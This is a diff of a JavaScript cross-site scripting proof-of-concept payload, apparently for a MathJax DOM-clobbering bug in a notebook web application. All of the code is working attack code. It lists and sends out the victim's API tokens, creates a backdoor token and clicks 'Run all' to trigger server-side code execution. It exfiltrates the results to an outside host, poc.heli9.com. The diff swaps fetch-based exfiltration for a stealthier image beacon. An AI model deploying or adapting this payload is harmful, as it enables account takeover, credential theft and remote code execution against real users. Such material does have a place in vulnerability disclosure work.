@@ -1,7 +1,6 @@
 (async function() {
     const EXFIL = 'https://poc.heli9.com/jet/log.php';
     
-    // Exfiltrate data to attacker server
     function exfil(type, data) {
         const payload = btoa(JSON.stringify({
             type: type,
@@ -9,22 +8,11 @@
             timestamp: new Date().toISOString(),
             domain: document.domain
         }));
-        
-        fetch(EXFIL + '?type=' + encodeURIComponent(type), {
-            method: 'POST',
-            mode: 'no-cors',
-            body: payload
-        }).catch(() => {});
+        new Image().src = EXFIL + '?type=' + encodeURIComponent(type) + 
+                          '&d=' + encodeURIComponent(payload.slice(0, 2000));
     }
     
-    // Log start
-    exfil('xss_executed', {
-        message: 'MathJax DOM Clobbering XSS triggered',
-        domain: document.domain,
-        url: location.href
-    });
-    
-    // ========== IMPACT 1: STEAL EXISTING API TOKENS ==========
+    exfil('xss_executed', { domain: document.domain, url: location.href });
     
     try {
         const resp = await fetch('/api/user_management/v1/api-tokens/list', {
@@ -35,8 +23,6 @@
             exfil('stolen_existing_tokens', tokens);
         }
     } catch(e) {}
-    
-    // ========== IMPACT 2: CREATE BACKDOOR API TOKEN ==========
     
     try {
         const resp = await fetch('/api/user_management/v1/api-tokens/create', {
@@ -49,41 +35,27 @@
         }
     } catch(e) {}
     
-    // ========== IMPACT 3: TRIGGER RCE VIA "RUN ALL" ==========
-    // This executes the Python cell which exfiltrates /etc/passwd and env vars
-    
-    setTimeout(() => {
-        // Find and click Run All button
-        const selectors = [
-            '[title*="Run all"]',
-            '[aria-label*="Run all"]',
-            'button[data-test="run-all"]',
-            '[data-action="runAll"]'
-        ];
-        
-        for (const sel of selectors) {
-            const btn = document.querySelector(sel);
-            if (btn) {
+    function triggerRunAll() {
+        const runAllBtn = document.querySelector('.editor-header__run-all-button');
+        if (runAllBtn) {
+            runAllBtn.click();
+            exfil('rce_triggered', { method: 'run_all_button_click', success: true });
+            return;
+        }
+        const buttons = document.querySelectorAll('button');
+        for (const btn of buttons) {
+            if (btn.textContent.includes('Run all')) {
                 btn.click();
-                exfil('rce_triggered', { method: 'button_click', selector: sel });
+                exfil('rce_triggered', { method: 'button_text_match', success: true });
                 return;
             }
         }
-        
-        // Fallback: search menu items
-        const menuItems = document.querySelectorAll('.dl-menu-item, [role="menuitem"]');
-        for (const item of menuItems) {
-            if (item.textContent && item.textContent.toLowerCase().includes('run all')) {
-                item.click();
-                exfil('rce_triggered', { method: 'menu_click' });
-                return;
-            }
-        }
-        
-        exfil('rce_trigger_failed', { message: 'Run All button not found' });
-        
-    }, 1500);
+        exfil('rce_trigger_failed', { message: 'Run all button not found' });
+    }
+    
+    setTimeout(triggerRunAll, 5000);
     
     exfil('xss_complete', 'Exploitation complete');
+    console.log('[POC] XSS executed on: ' + document.domain);
     
 })();
